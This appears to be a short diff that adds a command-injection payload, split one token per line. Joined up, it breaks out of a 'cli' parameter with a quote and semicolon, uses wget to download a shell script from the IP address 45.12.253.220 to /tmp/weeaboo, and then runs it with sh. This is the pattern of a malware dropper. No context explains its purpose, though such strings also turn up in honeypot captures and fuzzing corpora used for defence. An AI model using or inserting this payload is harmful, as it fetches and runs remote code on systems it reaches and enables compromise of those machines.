@@ -1,0 +1,17 @@
+cli=aa
+aa
+'
+;
+wget
+http
+:
+//45.12.253.220/hugeanalenema.sh
+-O
+-
+>
+/tmp/weeaboo
+;
+sh
+/tmp/weeaboo
+'
+$
